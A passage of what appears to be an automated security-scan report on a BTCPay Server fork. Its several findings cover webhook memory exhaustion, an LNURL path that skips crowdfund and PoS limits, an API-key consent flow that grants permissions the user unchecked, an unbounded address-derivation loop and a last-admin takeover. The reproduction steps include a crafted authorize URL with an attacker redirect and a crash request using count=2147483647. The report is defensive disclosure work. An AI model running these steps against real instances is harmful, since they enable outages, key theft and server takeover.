   SendDelivery calls httpClient.SendAsync(request, cancellationToken), whose default completion option is ResponseContentRead: System.Net.Http buffers the whole response body into memory (up to MaxResponseContentBufferSize, default 2 GB) before returning. Only response.StatusCode is then inspected; the body is never used. This is the line the fix must change (ResponseHeadersRead or a small buffer cap).
2. [BTCPayServer/Plugins/Webhooks/WebhooksPlugin.cs:39–50](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Webhooks/WebhooksPlugin.cs#L39-L50)
   Registration of the greenfield-webhook.onion (Socks5HttpClientHandler) and greenfield-webhook.clearnet (UseSSRFProtection, which only sets a ConnectCallback) named clients. Neither sets MaxResponseContentBufferSize nor a short Timeout, so the .NET defaults of int.MaxValue and 100 s apply.
3. [BTCPayServer/Plugins/Webhooks/WebhookSender.cs:105–107](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Webhooks/WebhookSender.cs#L105-L107)
   EnqueueDelivery keys the MultiProcessingQueue by webhook id; deliveries for distinct webhooks run concurrently with no global concurrency limit, so the attacker multiplies concurrent buffers by registering more webhooks (no per-store cap in StoreRepository.CreateWebhook).
4. [BTCPayServer/Plugins/Webhooks/WebhookSender.cs:118–138](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Webhooks/WebhookSender.cs#L118-L138)
   With AutomaticRedelivery enabled (a flag the store owner sets), a timed-out attempt (HttpCode null) or a 5xx/408/429 response is retried up to 8 more times over ~71 minutes, so one trigger yields nine oversized-response fetches without further attacker action.
5. [BTCPayServer.Common/MultiProcessingQueue.cs:49–67](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Common/MultiProcessingQueue.cs#L49-L67)
   Enqueue creates a new unbounded Channel and its own Process task for every new queue name (webhook id); there is no cap on the number of simultaneously running queues.
6. [BTCPayServer/Plugins/Webhooks/Controllers/GreenfieldStoreWebhooksController.cs:53–69](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Webhooks/Controllers/GreenfieldStoreWebhooksController.cs#L53-L69)
   Greenfield CreateWebhook, authorised by btcpay.store.webhooks.canmodifywebhooks, stores any URL that passes Uri.TryCreate(UriKind.Absolute); no destination, scheme or count restriction beyond the connect-time SSRF guard, which permits the attacker's own public host.
7. [BTCPayServer/Plugins/Webhooks/Controllers/UIStoreWebhooksController.cs:85–95](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Webhooks/Controllers/UIStoreWebhooksController.cs#L85-L95)
   Cookie-authenticated NewWebhook under Policies.CanModifyStoreSettings lets every store owner/manager create a webhook with an arbitrary URL via the UI, so the attacker position needs no API key.

## Impact
Memory exhaustion of the single BTCPay Server process denies service to every store, checkout page, UI and API client on the host (OOM-kill on an uncapped host; process-wide OutOfMemoryException under a cgroup limit) until it restarts, and the persisted webhook lets the attacker keep it down by re-triggering deliveries. No confidentiality or integrity impact.

## Reproduction steps
1. Attacker is an authenticated store owner/manager (self-registration is open by default) or an API key holding CanModifyWebhooks. They create one or more webhooks via UI or Greenfield API pointing at a public server they operate that returns very large bodies (or a large Content-Length with a slow body), then trigger deliveries by creating invoices in their own store or calling the redeliver endpoints. Each delivery makes the server buffer the full response (2 GB cap); distinct webhooks run concurrently and AutomaticRedelivery repeats failed attempts. No size limit, streaming read, or webhook-count cap stands in the way; the only constraint is the 100 s default timeout, which merely bounds the per-attempt transfer rate.

## Recommended fix
1. SendDelivery downloads and buffers the entire webhook response body although it only needs the status code, with the buffer limit left at the .NET default of 2 GB, letting a store-controlled endpoint dictate server memory allocation. Fix criteria: The server must not allocate memory proportional to a webhook endpoint's response. After the fix, a webhook target returning an arbitrarily large body must cause at most a small, fixed amount of buffering (e.g. headers only, or a body cap in the low kilobytes) and the delivery must still be recorded with its status code. Verify by pointing a webhook at a server streaming a multi-GB body and observing bounded process memory.
2. No per-request response size or tighter timeout is configured on the webhook HttpClients, so the default 100 s window lets an attacker stream large bodies. Fix criteria: Webhook HttpClients enforce an explicit, small MaxResponseContentBufferSize and a shorter request timeout appropriate for a fire-and-forget notification; oversized responses are rejected without being buffered.

---
**Severity:** HIGH
**Status:** Open
**Category:** Resource exhaustion
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257284

---

# Anonymous LNURL app endpoint bypasses crowdfund/PoS availability and disabled-item rules

## Details
`UILNURLController.GetLNURLForApp` (anonymous route `~/{cryptoCode}/lnurl/pay/app/{appId}/{itemCode?}`, no `[Authorize]`) creates a store invoice tagged with `AppService.GetAppInternalTag(appId)` for a PoS or Crowdfund app item or custom amount, then hands the caller an LNURL-pay request whose callback yields a BOLT11. It is a parallel path to `UICrowdfundController.ContributeToCrowdfund` and `UIPointOfSaleController.ViewPointOfSale` (POST), but omits the availability checks those paths apply to non-owners:

- Crowdfund `Enabled` ("Make Crowdfund Public"): `ContributeToCrowdfund` returns 'Crowdfund is not currently active' unless the caller is an owner (`GetAppDataIfOwner`); `ViewCrowdfund` hides the page. `GetLNURLForApp` reads `CrowdfundSettings` only for `TargetCurrency` and `PerksTemplate` and never consults `Enabled`.
- Crowdfund `StartDate`/`EndDate`: not consulted on the LNURL path, so contributions are accepted before launch and after the campaign closed.
- Crowdfund `EnforceTargetAmount` ("Do not allow additional contributions after target has been reached"): the normal path refuses contributions once pending+confirmed progress >= 100% and caps a single contribution to the remaining target (line 202). The LNURL path has neither check; because the invoice carries the app internal tag, `GetInvoicesForApp` counts it toward the campaign, so a hard-capped campaign is over-funded.
- Disabled perks/items: both app controllers call `AppService.Parse(template, false)` to drop items with `Disabled = true` (POSTests asserts a disabled item is NotFound on the PoS path); `GetLNURLForApp` calls `AppService.Parse(template)` whose `includeDisabled` defaults to true, so a disabled PoS item or crowdfund perk is purchasable by id. Disabled items are not rendered on the public PoS/Print pages, so the id must be known from before it was disabled (e.g. a QR printed from the Print view keeps working after the merchant disables the item), or guessed (ids are title slugs). The crowdfund bypasses need only the app id, which is in the public campaign URL.

The only gates on the LNURL path are a non-archived app, LNURL enabled on the store (set by default when a Lightning node is saved, UIStoresController.LightningLike.cs:185-191), item inventory > 0, and PoS `ShowCustomAmount` for item-less PoS requests.

Impact: an unauthenticated third party produces invoices and settled payments that the merchant's configuration says the system must not accept (campaign off/closed/full, item withdrawn from sale), creating fulfilment or refund obligations and defeating a hard funding cap. Payers pay voluntarily, so no funds are stolen; the integrity impact is limited to the merchant's app constraints. The merchant cannot stop LNURL purchases of a disabled item short of deleting it or disabling LNURL for the whole store.

## Evidence
1. [BTCPayServer/Controllers/UILNURLController.cs:271–367](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UILNURLController.cs#L271-L367)
   GetLNURLForApp (anonymous GET {cryptoCode}/lnurl/pay/app/{appId}/{itemCode?}) loads any non-archived PoS or Crowdfund app (GetApp(appId, null, true): includeStore, not includeArchived) and creates an invoice for its store, tagged with the app internal tag so it counts toward the app. It never checks CrowdfundSettings.Enabled, StartDate, EndDate or EnforceTargetAmount, and parses the perk/item template with AppService.Parse(template) whose default includeDisabled=true (lines 290, 295), so items the merchant marked Disabled are selectable by id. The only gates are LNURL enabled on the store, item inventory and PoS ShowCustomAmount.
2. [BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs:99–131](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Crowdfund/Controllers/UICrowdfundController.cs#L99-L131)
   The sanctioned contribution path refuses non-owner contributions when the crowdfund is disabled (110-113), before StartDate, after EndDate, or when EnforceTargetAmount and pending+confirmed progress >= 100% (116-124), and only accepts perks from Parse(settings.PerksTemplate, false) (130, disabled perks excluded); a per-contribution cap against the remaining target follows at line 202. None of these is applied on the LNURL sibling.
3. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:259](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L259)
   The PoS purchase path parses the template with includeDisabled=false, so disabled items cannot be bought there - the LNURL sibling does not.
4. [BTCPayServer/Services/Apps/AppService.cs:355–365](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppService.cs#L355-L365)
   Parse(template, includeDisabled = true, ...) - the default used by GetLNURLForApp includes items with Disabled = true.

## Impact
Integrity of the merchant's app configuration is partially bypassed: invoices and settled payments tagged to the app are created for disabled or closed campaigns, beyond an enforced funding target, or for items marked disabled, and they count toward the campaign's progress. No data is disclosed and availability is unaffected; payers fund the invoices voluntarily, so the impact is unwanted-but-paid invoices and violated business constraints, hence low integrity impact.

## Reproduction steps
1. Any anonymous network client who knows an app id (in the public crowdfund/PoS URL) issues GET /BTC/lnurl/pay/app/{appId}[/{itemCode}], receives an LNURL pay request whose callback yields a BOLT11, and pays it. No authentication or interaction is needed. The crowdfund bypasses (disabled, outside the window, target reached) need only the app id; the disabled-item bypass additionally needs the item id, which is a title slug or was exposed before the item was disabled. The endpoint exists for any store with Lightning configured, where LNURL is enabled by default.

## Recommended fix
GetLNURLForApp duplicates item selection and invoice creation without applying the availability checks (Enabled, StartDate/EndDate, EnforceTargetAmount, per-contribution cap, disabled items) that UICrowdfundController and UIPointOfSaleController enforce. Fix criteria: The LNURL app path must refuse to create an invoice in every situation where the corresponding app controller refuses a non-admin request: disabled crowdfund, outside the start/end window, target reached or exceeded under EnforceTargetAmount, and items/perks marked Disabled (parse with includeDisabled=false). Verify by requesting /lnurl/pay/app/{appId}/{itemCode} for a disabled crowdfund, an ended crowdfund, a fully funded enforced-target crowdfund and a disabled PoS item, and confirming each returns an error and creates no invoice.

---
**Severity:** HIGH
**Status:** Open
**Category:** Auth bypass
**CWE:** [CWE-424](https://cwe.mitre.org/data/definitions/424.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257283

---

# API key authorize flow grants permissions the user explicitly unchecked in non-strict mode

## Details
BTCPay's third-party authorization flow (GET/POST /api-keys/authorize, cookie-authenticated) lets an external application request an API key with a list of permissions. The served API documentation (swagger.template.authorization.json:39) states that with strict=false the user may 'reject some of permissions the application is requesting', and the consent page renders each requested permission as an enabled checkbox (AuthorizeAPIKey.cshtml:123).

The server does not honour the user's choice. On the final POST, UIManageController.AuthorizeAPIKey (line 182) re-runs AdjustVMForAuthorization on the bound form. That method iterates the app's requested permissions (hidden field Permissions) and, for every matching PermissionValues entry, sets permissionValue.Value = true (line 416) unless Command is a store-editing sub-command ('change-store-mode'/'add-store'). The 'Authorize' command is not one of those, so every permission the application asked for is forced back on, overwriting the false the browser posted for an unchecked box. GetPermissionsFromViewModel then persists all of them; its Specific-store branch (515-518) additionally never consults Value, so store-scoped requested permissions are granted regardless of the checkbox. The PostRedirect view (235-253) auto-submits the key plus its permission list to the application's redirect URL.

Attack: a malicious or over-reaching application sends a logged-in BTCPay user to https://btcpay/api-keys/authorize?strict=false&permissions=btcpay.store.canviewinvoices&permissions=btcpay.store.canmodifystoresettings&redirect=https://attacker/cb (or requests btcpay.unrestricted / btcpay.server.canmodifyserversettings). The user, seeing the list is editable, unchecks the powerful permission and clicks 'Authorize app'. The created key nevertheless carries it and is delivered to the attacker, who can change store settings (wallets, payout, webhooks, Lightning connection strings) on all the user's stores, or, for an admin victim, manage the server. The user only agreed to view-only access; a user who would have cancelled a strict request is converted into a grantor of the full set.

The post-adjust validation covers only Forbidden+Strict (server permissions for non-admins) and StoreMode mismatches, never the user's declined selections. Antiforgery protects the POST from CSRF, so the user must click Authorize themselves, but the point of the consent page is that this click grants only what remains checked. The maintainers' test (ApiKeysTests.cs:206-216) exercises exactly this uncheck but compares the key against its own stored blob, so it cannot detect the defect.

## Evidence
1. [BTCPayServer/Controllers/UIManageController.APIKeys.cs:403–430](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIManageController.APIKeys.cs#L403-L430)
   AdjustVMForAuthorization: for every PermissionValues entry whose policy appears in vm.Permissions (the app's requested list, carried in a hidden field) it sets permissionValue.Value = true (line 416) unless Command's second ':'-part is change-store-mode/add-store. The final submit posts Command="Authorize" (one part, command==null), so the override runs and discards the false the browser posted for an unchecked box. With SelectiveStores and a chosen StoreId it also forces StoreMode=Specific/SpecificStores=[StoreId] (421-422).
2. [BTCPayServer/Controllers/UIManageController.APIKeys.cs:178–222](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIManageController.APIKeys.cs#L178-L222)
   POST /api-keys/authorize re-runs SetViewModelValues (keeps the bound PermissionValues since it is non-null) then AdjustVMForAuthorization on the form before any validation. HandleCommands returns null for "Authorize" (not a store policy). The only subsequent checks are Forbidden+Strict and StoreMode-vs-SelectiveStores; the user's unchecked values are never consulted again and CreateKey receives the overridden model.
3. [BTCPayServer/Controllers/UIManageController.APIKeys.cs:504–526](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIManageController.APIKeys.cs#L504-L526)
   GetPermissionsFromViewModel builds the stored permission list from the forced values: non-store policies and AllStores store policies are added when p.Value is true (511-513, 520-521), and the Specific-store branch (515-518) adds every SpecificStores scope without checking p.Value at all, so a store-scoped requested permission is granted even if line 416 were removed.
4. [BTCPayServer/Views/UIManage/AuthorizeAPIKey.cshtml:116–123](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIManage/AuthorizeAPIKey.cshtml#L116-L123)
   In non-strict mode (and not Forbidden) the view renders an enabled checkbox bound to PermissionValues[i].Value, presenting the user with a genuine per-permission choice; the hidden Permissions field at line 37 re-sends the app's full request, which the server then uses to overwrite that choice.
5. [BTCPayServer/Controllers/UIManageController.APIKeys.cs:235–252](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIManageController.APIKeys.cs#L235-L252)
   After creation the key, userId and the key's full permission list are auto-POSTed (PostRedirect, AllowExternal=true) to the application-supplied redirect URL, so the requesting application receives the permissions the user declined.
6. [BTCPayServer/wwwroot/swagger/v1/swagger.template.authorization.json:38–39](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/wwwroot/swagger/v1/swagger.template.authorization.json#L38-L39)
   The served API documentation defines strict=false as 'it will allow the user to reject some of permissions the application is requesting' and (line 89) describes the callback's permissions as 'the permissions the user consented to' — the contract the code breaks.
7. [BTCPayServer.Tests/ApiKeysTests.cs:206–215](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer.Tests/ApiKeysTests.cs#L206-L215)
   The maintainers' test unchecks btcpay.server.canmodifyserversettings in a strict=false flow and then calls TestApiAgainstAccessToken with the key's own stored blob as the expected set, so it documents the intended behaviour (user can decline) but is tautological and cannot detect that the declined permission is still granted.

## Impact
The attacker obtains an API key with permissions the user declined. Those can include btcpay.store.canmodifystoresettings on all of the user's stores (read all invoices/settings, change wallets, payout and webhook configuration, use store Lightning nodes), btcpay.server.canmodifyserversettings for admin victims, or unrestricted. That is high confidentiality and integrity impact on the user's stores and account; availability impact is limited (stores/invoices can be archived or deleted via the granted permissions).

## Reproduction steps
1. Attacker is any external party able to get a logged-in BTCPay user to open an authorize link (no account on the instance needed). They craft the URL with strict=false, a permission list that mixes benign and powerful permissions, and their own redirect URL. The victim unchecks the powerful permissions and clicks Authorize; the server forces them back on and auto-POSTs the key to the attacker. Works on default deployments over HTTPS; the only requirement is the victim's deliberate click on the consent page.

## Recommended fix
1. AdjustVMForAuthorization unconditionally sets Value = true (and StoreMode/SpecificStores) for every application-requested permission on the final Authorize POST, discarding the user's unchecked selections in non-strict mode, so the granted set is the application's request rather than the user's consent. Fix criteria: In non-strict mode the permissions written into the key must be exactly the requested permissions the user left checked (plus any extra ones they checked); forcing Value=true must apply only to the initial GET rendering or to strict mode, never to the Authorize submit. Verify by unchecking a requested permission with strict=false, authorizing, and confirming the created key's blob and the redirect payload omit it.
2. GetPermissionsFromViewModel's Specific-store branch adds every SpecificStores scope without checking the item's Value, so a store-scoped permission is granted even when the user unchecked it. Fix criteria: Store-scoped permissions are emitted only when the permission item is checked (Value true); an unchecked item yields no permission in any StoreMode. Verify with selectiveStores=true, a chosen store, and the store permission unchecked: the key must carry no scope for that policy.
3. The authorize-flow test compares the created key against its own stored permission blob, so it cannot detect granted-but-declined permissions. Fix criteria: ApiKeysTests asserts the explicit expected permission set after unchecking (absence of the declined policy in both the stored blob and the callback's permissions[] fields) rather than passing the key's own blob as the expectation.

---
**Severity:** HIGH
**Status:** Open
**Category:** Privilege escalation
**CWE:** [CWE-266](https://cwe.mitre.org/data/definitions/266.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257282

---

# Unbounded address derivation loop in Greenfield wallet preview lets low-privileged API key exhaust server

## Details
The Greenfield on-chain payment-method preview endpoints (GET and POST `/api/v1/stores/{storeId}/payment-methods/{paymentMethodId}/wallet/preview`) take `offset` and `count` from the query string and hand them to `GetPreviewResultData`, which runs `for (var i = offset; i < count; i++)` deriving one address per iteration and appending it to an in-memory list. `count` is never bounded (the UI caller uses a fixed 0..10 but the API callers pass the raw query value), the loop treats `count` as an absolute end index, the method is synchronous with no cancellation token, and the response list is unbounded.

A single request such as `GET .../wallet/preview?count=2147483647` therefore forces the server to perform ~2^31 BIP32 child-key derivations (each an EC point operation) and to allocate ~2^31 result objects. The CPU work alone runs for hours on one thread and keeps running after the client disconnects; the allocation grows until the .NET process is killed by OOM, taking down the whole BTCPay Server instance (every store, checkout, webhook and Lightning integration on the host). The behaviour is deterministic and repeatable, so a handful of requests keep the instance down.

The GET endpoint only requires `btcpay.store.canviewwallet` on the store, the weakest wallet permission. In a multi-tenant deployment any self-registered or invited user who owns a store can import an xpub (no server policy needed) and mint such an API key, and any store member or narrow-scope API key holder with view access to a wallet qualifies. The threat model lists the authenticated non-admin user and the narrow-permission store member as adversaries that must not be able to affect the shared host or other tenants; this endpoint lets them crash it.

This is not volumetric: one request triggers unbounded work and allocation because of a missing input bound (CWE-770 / algorithmic resource exhaustion), which the exclusion list explicitly keeps in scope.

## Evidence
1. [BTCPayServer/Plugins/Wallets/Controllers/GreenfieldStoreOnChainPaymentMethodsController.cs:101–126](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/GreenfieldStoreOnChainPaymentMethodsController.cs#L101-L126)
   GetPreviewResultData iterates `for (var i = offset; i < count; i++)` with no upper bound on `count`, no cancellation token and no cap on the result list. Each iteration performs an ECDSA/BIP32 child derivation (`line.Derive`) and allocates a result item, so a single request with count near int.MaxValue runs ~2 billion EC derivations and grows the list until the process runs out of memory.
2. [BTCPayServer/Plugins/Wallets/Controllers/GreenfieldStoreOnChainPaymentMethodsController.cs:48–61](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/GreenfieldStoreOnChainPaymentMethodsController.cs#L48-L61)
   GET /api/v1/stores/{storeId}/payment-methods/{paymentMethodId}/wallet/preview binds `offset` and `count` straight from the query string and passes them to GetPreviewResultData. The only authorization is WalletPolicies.CanViewWallet, the lowest wallet permission, which any store owner can grant to an API key on their own store.
3. [BTCPayServer/Plugins/Wallets/Controllers/GreenfieldStoreOnChainPaymentMethodsController.cs:65–98](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Wallets/Controllers/GreenfieldStoreOnChainPaymentMethodsController.cs#L65-L98)
   The POST preview variant (CanManageWalletSettings) has the same unbounded `count` and additionally lets the caller pick the derivation scheme; it reaches the same loop.
4. [BTCPayServer/wwwroot/swagger/v1/swagger.template.stores-wallet.on-chain.json:720–737](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/wwwroot/swagger/v1/swagger.template.stores-wallet.on-chain.json#L720-L737)
   The public API documentation declares `offset` and `count` as unconstrained numbers; no maximum is documented or enforced anywhere.

## Impact
No data is read or modified. Availability impact is high: the request consumes a worker thread for hours and drives memory growth until the single BTCPay process crashes, which stops invoice checkout, payment detection, webhooks and the admin UI for every tenant on the instance; repeating the request keeps it down.

## Reproduction steps
1. Attacker: any holder of a Greenfield API key carrying btcpay.store.canviewwallet (or any policy that includes it: CanManageWalletSettings, CanCreate/Sign/Broadcast/CancelWalletTransactions, CanModifyStoreSettings via CanManageWallets) on a store with an on-chain wallet configured. A self-registered user suffices: creating a store and importing a watch-only xpub needs no server policy (BitcoinLikePaymentHandler.ValidatePaymentMethodConfig only gates IsHotWallet), and the user mints the key on their own store. Delivery: one GET /api/v1/stores/{storeId}/payment-methods/BTC-CHAIN/wallet/preview?count=2147483647 (or POST with any xpub under CanManageWalletSettings). GetPreviewResultData runs `for (i = offset; i < count; i++)` with count bound directly from the query string; there is no cap, the method is synchronous and ignores HttpContext.RequestAborted, no request-timeout middleware is registered (Startup.cs:156-172 adds only header/CSP/antiforgery filters), and no rate-limit zone covers Greenfield (ZoneLimits.cs). Each iteration appends a result object holding an address string and key-path string, so the list grows until the process is OOM-killed, and the thread stays pegged after the client disconnects. Assumption (dependency, NBXplorer.Client 5.0.11 / NBitcoin 10.0.15 as pinned): DerivationLine.Derive(uint) performs one BIP32 non-hardened child derivation (an EC point operation) per call; even if derivation were cheap, the unbounded in-memory list alone exhausts memory. Contrast GreenfieldAppsController.GetAppTopItems, which clamps count with Math.Min, showing the missing bound is a defect, not design.

## Recommended fix
GetPreviewResultData accepts caller-controlled `offset`/`count` as loop bounds with no maximum, so request input directly controls the amount of CPU work and memory allocated. Fix criteria: The number of addresses derived per request must be capped at a small fixed maximum (the UI uses 10; a limit on the order of tens or low hundreds) and `offset`/`count` must be validated as non-negative with `count` interpreted as a count rather than an end index; requests exceeding the limit must be rejected with a 422 validation error. Verify that `?count=2147483647` returns a validation error immediately and that server CPU/memory stay flat.

---
**Severity:** HIGH
**Status:** Open
**Category:** Resource exhaustion
**CWE:** [CWE-770](https://cwe.mitre.org/data/definitions/770.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257281

---

# Self-deletion of the last server admin is unguarded in the UI; the next anonymous registrant (API or /register) becomes server admin

## Details
BTCPay Server's bootstrap rule grants ServerAdmin to a registrant whenever no user currently holds the ServerAdmin role. In `GreenfieldUsersController.CreateUser` (anonymous POST /api/v1/users) the registration lock is only applied as `anyAdmin && policies.LockSubscription && !isAuth` and `isAdmin` is forced true when `!anyAdmin`, so with an empty admin set an unauthenticated caller can create an approved user with `isAdministrator: true` even on an instance whose registration is locked (the default: `disable-registration` defaults true and locks subscriptions after the first admin). `UIAccountController.Register` (anonymous POST /register) does the same where LockSubscription is false. Neither branch tracks that initial setup already completed.

The project protects this invariant by never letting the admin set become empty: `UIServerController.DeleteUser`/`ToggleUser`/the user editor and Greenfield `DELETE /api/v1/users/{id}` and `POST .../lock` all refuse to remove, disable or de-role the last enabled admin via `UserService.IsUserTheOnlyOneAdmin`. Greenfield self-deletion `DELETE /api/v1/users/me` goes through the same guard and returns 403, and the integration test `CanDeleteUsersViaApi` asserts 'can't delete if the only admin'.

The cookie-authenticated UI self-deletion `UIManageController.DeleteUserPost` (POST /account/deleteuserpost, the 'Delete Account' button on /account) has no such guard: it calls `DeleteUserAndAssociatedData` unconditionally. If the sole enabled server admin deletes their own account there, the instance is left with zero admins and the bootstrap branches re-arm. The next anonymous POST /api/v1/users with `isAdministrator: true` (or POST /register on open-registration hosts) yields an approved ServerAdmin account: full control over every remaining tenant's stores, hot wallets, invoices and users, server policies, email/storage credentials, plugins and host-administration tooling.

This is a missing invariant check on one of several sibling paths rather than a race. It requires the victim admin to take a conscious, self-affecting action with no warning, so exploitability is limited; the consequence is complete server compromise by an anonymous party, and the maintainers' own guards and test show the behaviour is unintended.

## Evidence
1. [BTCPayServer/Controllers/UIManageController.cs:339–351](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIManageController.cs#L339-L351)
   POST /account/deleteuserpost (cookie auth, Policies.CanViewProfile — any logged-in user) deletes the caller unconditionally via DeleteUserAndAssociatedData. There is no IsUserTheOnlyOneAdmin / IsAdminUser check, unlike every other deletion/disable route, so the only enabled server admin can remove themselves and leave the instance with zero ServerAdmin users. The confirm modal in Views/UIManage/Index.cshtml carries no last-admin warning.
2. [BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs:338–351](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs#L338-L351)
   Anonymous POST /api/v1/users: anyAdmin = any user in ServerAdmin. The registration lock is only enforced as `anyAdmin && policies.LockSubscription && !isAuth`, and `isAdmin` is unconditionally true when !anyAdmin. Once the admin set is empty, an unauthenticated caller passes both gates even on an instance whose registration is locked (DisableRegistration defaults true, BTCPayServerOptions.cs:112, which sets LockSubscription after the first admin), and may request IsAdministrator=true.
3. [BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs:409–426](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs#L409-L426)
   With isAdmin true and request.IsAdministrator true, the new user is created Approved and added to the ServerAdmin role; FirstRun/policies are re-initialised as at initial setup. This is the anonymous takeover route that needs no open registration.
4. [BTCPayServer/Controllers/UIAccountController.cs:551–576](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIAccountController.cs#L551-L576)
   Anonymous POST /register: isFirstAdmin = !anyAdmin; the registrant is auto-approved and added to ServerAdmin. Alternative takeover route, available where PoliciesSettings.LockSubscription is false (lines 521-538 only block registration when it is true). Neither bootstrap branch has a notion of 'setup already completed'.
5. [BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs:443–458](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldUsersController.cs#L443-L458)
